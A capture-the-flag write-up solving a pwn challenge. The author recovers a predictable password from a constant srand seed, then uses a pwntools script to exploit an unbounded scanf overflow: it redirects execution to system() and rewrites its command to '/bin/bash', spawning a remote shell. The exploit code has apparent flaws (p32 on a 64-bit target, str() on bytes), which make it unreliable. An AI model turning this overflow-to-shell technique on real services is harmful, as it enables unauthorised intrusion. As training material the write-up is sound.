# Tr0ll gu3ssing

### Description
Challenge : [Tr0ll gu3ssing](./tr0ll_gu3ssing)<br>
Category  : Pwn<br>
Your task is to find the password without getting trolled, Can you do it?<br>
Connect here to see: 3.91.133.232 4001<br>

![alt challenge](./tr0ll_gu3ssing.jpg)

### Playing with the binary

```bash
$ file tr0ll_gu3ssing
tr0ll_gu3ssing: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7c962869e837557961eed8c73b617c0b4da0a43a, not stripped
$ checksec --file=tr0ll_gu3ssing
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74) Symbols
```
When we execute the binary locally, it keeps asking for a password
```
$ ./tr0ll_gu3ssing
Can you guess the password : password
Wrong !
Can you guess the password : ^C
```
So I opened the binary in Ghidra and I found that the main() function calls rand_str() function in a while loop which generates<br>
31 random numbers and uses them to construct a 31 bytes long password and waits for input, if we can guess the random password<br>
it will execute system("/bin/cat flag.txt") and give us the flag. At first glance I noticed that the srand() function is  using<br>
a constant as a seed, which means the random numbers will be repeated for every execution of the program and the passwords too<br>
```C
undefined8 main(void)

{
  int iVar1;
  char local_48 [32];
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0x7461632f6e69622f;	//These lines represent
  local_20 = 0x78742e67616c6620;	//the string "/bin/cat flag.txt"
  local_18 = 0x74;			//
  local_10 = 0;				//
  setup();
  srand(0xfedcba98);  			// <== the srand seed is a constant
  while( true ) {
     rand_str(password,0x1f);
     printf("Can you guess the password : ");
     __isoc99_scanf(&DAT_00400ab6,local_48);
     iVar1 = strcmp(local_48,password);
     if (iVar1 == 0) break;
     puts("Wrong !");
  }
  system((char *)&local_28);		//This lines executes "/bin/cat flag.txt"
  return 0;
}
```
So I executed the program with ltrace to copy the password, than executed the program again to enter the password
```bash
setvbuf(0x7f8175d56500, 0, 2, 0)                         = 0
setvbuf(0x7f8175d56420, 0, 2, 0)                         = 0
srand(0xfedcba98, 0, 0, 3072)                            = 0
rand(0x6010b0, 31, 30, 0xffffffff)                       = 0x349fd0f7
rand(0x7f8175d555a0, 0x7ffd255acfb4, 29, 0x7ffd255acff0) = 0x21c7f95e
rand(0x7f8175d555a0, 0x7ffd255acfb4, 28, 0x7ffd255acff0) = 0x54e61835
rand(0x7f8175d555a0, 0x7ffd255acfb4, 27, 0x7ffd255acff0) = 0x4b7b9ebd
rand(0x7f8175d555a0, 0x7ffd255acfb4, 26, 0x7ffd255acff0) = 0x228d91b9
rand(0x7f8175d555a0, 0x7ffd255acfb4, 25, 0x7ffd255acff0) = 0x6c61ddb
rand(0x7f8175d555a0, 0x7ffd255acfb4, 24, 0x7ffd255acff0) = 0x2ed20179
rand(0x7f8175d555a0, 0x7ffd255acfb4, 23, 0x7ffd255acff0) = 0xb9716cb
rand(0x7f8175d555a0, 0x7ffd255acfb4, 22, 0x7ffd255acff0) = 0xfd12d8
rand(0x7f8175d555a0, 0x7ffd255acfb4, 21, 0x7ffd255acff0) = 0x7e7d104c
rand(0x7f8175d555a0, 0x7ffd255acfb4, 20, 0x7ffd255acff0) = 0x311d19a4
rand(0x7f8175d555a0, 0x7ffd255acfb4, 19, 0x7ffd255acff0) = 0x246dc994
rand(0x7f8175d555a0, 0x7ffd255acfb4, 18, 0x7ffd255acff0) = 0x22944d10
rand(0x7f8175d555a0, 0x7ffd255acfb4, 17, 0x7ffd255acff0) = 0x50177ec7
rand(0x7f8175d555a0, 0x7ffd255acfb4, 16, 0x7ffd255acff0) = 0x77677ea4
rand(0x7f8175d555a0, 0x7ffd255acfb4, 15, 0x7ffd255acff0) = 0x3e78d0eb
rand(0x7f8175d555a0, 0x7ffd255acfb4, 14, 0x7ffd255acff0) = 0x3813b56
rand(0x7f8175d555a0, 0x7ffd255acfb4, 13, 0x7ffd255acff0) = 0x3f6dc89
rand(0x7f8175d555a0, 0x7ffd255acfb4, 12, 0x7ffd255acff0) = 0x324c42e8
rand(0x7f8175d555a0, 0x7ffd255acfb4, 11, 0x7ffd255acff0) = 0x2590bee1
rand(0x7f8175d555a0, 0x7ffd255acfb4, 10, 0x7ffd255acff0) = 0x238078f5
rand(0x7f8175d555a0, 0x7ffd255acfb4, 9, 0x7ffd255acff0)  = 0x75cff8db
rand(0x7f8175d555a0, 0x7ffd255acfb4, 8, 0x7ffd255acff0)  = 0x5f982bb7
rand(0x7f8175d555a0, 0x7ffd255acfb4, 7, 0x7ffd255acff0)  = 0x33b26bc4
rand(0x7f8175d555a0, 0x7ffd255acfb4, 6, 0x7ffd255acff0)  = 0x729ab7d8
rand(0x7f8175d555a0, 0x7ffd255acfb4, 5, 0x7ffd255acff0)  = 0x345fb224
rand(0x7f8175d555a0, 0x7ffd255acfb4, 4, 0x7ffd255acff0)  = 0x16cb4791
rand(0x7f8175d555a0, 0x7ffd255acfb4, 3, 0x7ffd255acff0)  = 0x5a597d0
rand(0x7f8175d555a0, 0x7ffd255acfb4, 2, 0x7ffd255acff0)  = 0x11cc008c
rand(0x7f8175d555a0, 0x7ffd255acfb4, 1, 0x7ffd255acff0)  = 0x752d837e
rand(0x7f8175d555a0, 0x7ffd255acfb4, 0, 0x7ffd255acff0)  = 0x757a8394
printf("Can you guess the password : "Can you guess the password : )                  = 29
__isoc99_scanf(0x400ab6, 0x7ffd255ad060, 0, 0password
)           = 1
strcmp("password", "pgFAg3m50ZnhgCVu11oihVKpTpb28UU")    = -6	    // <== here is the first generated password
puts("Wrong !" ^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
$ ./tr0ll_gu3ssing
Can you guess the password : pgFAg3m50ZnhgCVu11oihVKpTpb28UU
/bin/cat: flag.txt: No such file or directory
```
Cool! Now let's try it in the remote host
```bash
$ nc 3.91.133.232 4001
Can you guess the password : pgFAg3m50ZnhgCVu11oihVKpTpb28UU
We've been tricked, we've been backstabbed and we've been quite possibly, bambooozled.
```
It seems that the flag.txt file was just a trap, this is a pwn challenge afterall, and all we did until now is reversing<br>
so let's try something different, notice that the main() function uses scanf() for input, and there is no length check!<br>
We have a buffer-overflow with no stack-canary and with PIE disabled, so let's write an exploit:<br>
### Exploit
1_ overwrite the return address with system() gadget address.<br>
2_ overwrite the "/bin/cat flag.txt" string with "/bin/bash\0".<br>
3_ enter the right password for the 3rd iteration to break the loop and get a shell.<br>
```python3
#!/usr/bin/env python3

from pwn import *

log.info(ELF("./tr0ll_gu3ssing").checksec())

io = remote('3.91.133.232', 4001)

system_gadget = p32(0x400870)

log.info('Overwriting the return address with system() gadget address')
io.sendline('A'*0x48 + str(system_gadget))

log.info('Overwriting the string "/bin/cat flag.txt" with "/bin/bash\0"')
io.sendline('A'*0x20 + '/bin/bash')

log.info('Sending the 3rd password to break the loop')
io.sendline('IQ0RiDmPhQKcCi4RSXvK75mHxor2y6t')

io.interactive()
io.close()
```
# Flag
```
$ ./exploit.py
[*] '/home/shell/Documents/shellmates/tr0ll_gu3ssing/tr0ll_gu3ssing'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 3.91.133.232 on port 4001: Done
[*] Overwriting the return address with system() gadget address
[*] Overwriting the string "/bin/cat flag.txt" with "/bin/bash\x00
[*] Sending the 3rd password to break the loop
[*] Switching to interactive mode
Can you guess the password : Wrong !
Can you guess the password : Wrong !
Can you guess the password : $ ls
Th3_acTu4l_fl4G.txt
flag.txt
runserver.sh
tr0ll_gu3ssing
$ cat Th3_acTu4l_fl4G.txt
shellmates{ev3n_sc4nf_ha5_pr0bl3ms}
$
[*] Closed connection to 3.91.133.232 port 4001
```
